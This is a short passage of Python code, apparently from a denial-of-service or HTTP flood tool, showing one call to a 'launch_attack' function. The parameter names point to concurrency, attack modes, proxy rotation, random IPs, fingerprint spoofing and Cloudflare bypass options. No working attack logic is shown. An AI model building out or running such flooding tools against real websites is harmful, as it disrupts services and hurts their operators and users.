    
    launch_attack(
        target_url=target_url,
        duration=duration,
        concurrency=concurrency,
        method=method,
        rate_limit=rate_limit,
        attack_mode=attack_mode,
        use_proxy=use_proxy,
        use_ssl_bypass=use_ssl_bypass,
        use_fingerprint=use_fingerprint,
        use_referer=use_referer,
        use_random_ip=use_random_ip,
        use_cloudflare=use_cloudflare,
        custom_headers=custom_headers if custom_headers else None
    )
